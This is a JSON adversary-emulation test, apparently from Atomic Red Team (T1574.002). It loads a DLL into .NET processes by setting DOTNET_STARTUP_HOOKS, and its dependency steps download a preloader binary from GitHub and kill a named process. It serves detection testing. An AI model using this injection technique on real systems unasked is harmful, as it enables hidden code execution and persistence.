{
  "id": "d322cdd7-7d60-46e3-9111-648848da7c02",
  "name": "DLL Side-Loading using the dotnet startup hook environment variable",
  "description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "5bea7ced-dbd4-410f-a067-0d92044f5b35",
      "type": "execute-command",
      "data": {
        "command": "set DOTNET_STARTUP_HOOKS=\"#{preloader_dll}\"\ndotnet -h \u003e nul\necho.\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "72a487c0-c9dd-40c8-a2ab-da223de059e9",
      "type": "execute-command",
      "data": {
        "command": "taskkill /F /IM #{process_name} \u003enul 2\u003e\u00261\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "fc5b88bf-a069-4de5-90f7-cba422aa9f16",
      "name": "Check dependency 1/2",
      "description": ".Net SDK must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"C:\\Program Files\\dotnet\\dotnet.exe\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d38b61d3-9044-46d9-b558-c61149754eb0",
      "name": "Resolve dependency 1/2",
      "description": ".Net SDK must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h \u003e $null\necho.\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5eeeecb6-1003-4d90-82e0-a68875305bd3",
      "name": "Re-check dependency 1/2",
      "description": ".Net SDK must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"C:\\Program Files\\dotnet\\dotnet.exe\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "aa626036-eab0-4447-b7aa-6400828dd2e3",
      "name": "Check dependency 2/2",
      "description": "preloader must exist\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{preloader_dll}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "f404016a-f98d-4754-baae-c81ed3f6c568",
      "name": "Resolve dependency 2/2",
      "description": "preloader must exist\n",
      "type": "execute-command",
      "data": {
        "command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/preloader?raw=true\" -OutFile \"#{preloader_dll}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7969f000-7f6c-4dde-87d9-8ae2b6adb0c3",
      "name": "Re-check dependency 2/2",
      "description": "preloader must exist\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{preloader_dll}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "5bea7ced-dbd4-410f-a067-0d92044f5b35",
      "p": "on-success",
      "o": "72a487c0-c9dd-40c8-a2ab-da223de059e9"
    },
    {
      "s": "5bea7ced-dbd4-410f-a067-0d92044f5b35",
      "p": "on-failure",
      "o": "72a487c0-c9dd-40c8-a2ab-da223de059e9"
    },
    {
      "s": "fc5b88bf-a069-4de5-90f7-cba422aa9f16",
      "p": "on-success",
      "o": "5bea7ced-dbd4-410f-a067-0d92044f5b35"
    },
    {
      "s": "fc5b88bf-a069-4de5-90f7-cba422aa9f16",
      "p": "on-failure",
      "o": "d38b61d3-9044-46d9-b558-c61149754eb0"
    },
    {
      "s": "d38b61d3-9044-46d9-b558-c61149754eb0",
      "p": "on-success",
      "o": "5eeeecb6-1003-4d90-82e0-a68875305bd3"
    },
    {
      "s": "5eeeecb6-1003-4d90-82e0-a68875305bd3",
      "p": "on-failure",
      "o": "5bea7ced-dbd4-410f-a067-0d92044f5b35"
    },
    {
      "s": "aa626036-eab0-4447-b7aa-6400828dd2e3",
      "p": "on-success",
      "o": "5bea7ced-dbd4-410f-a067-0d92044f5b35"
    },
    {
      "s": "aa626036-eab0-4447-b7aa-6400828dd2e3",
      "p": "on-failure",
      "o": "f404016a-f98d-4754-baae-c81ed3f6c568"
    },
    {
      "s": "f404016a-f98d-4754-baae-c81ed3f6c568",
      "p": "on-success",
      "o": "7969f000-7f6c-4dde-87d9-8ae2b6adb0c3"
    },
    {
      "s": "7969f000-7f6c-4dde-87d9-8ae2b6adb0c3",
      "p": "on-failure",
      "o": "5bea7ced-dbd4-410f-a067-0d92044f5b35"
    }
  ],
  "tags": [
    "T1574.002",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "process_name",
      "type": "string",
      "description": "Name of the created process",
      "value": "calculator.exe"
    },
    {
      "name": "preloader_dll",
      "type": "path",
      "description": "library for interfacing with the dotnet framework",
      "value": "PathToAtomicsFolder\\T1574.002\\bin\\preloader.dll"
    }
  ]
}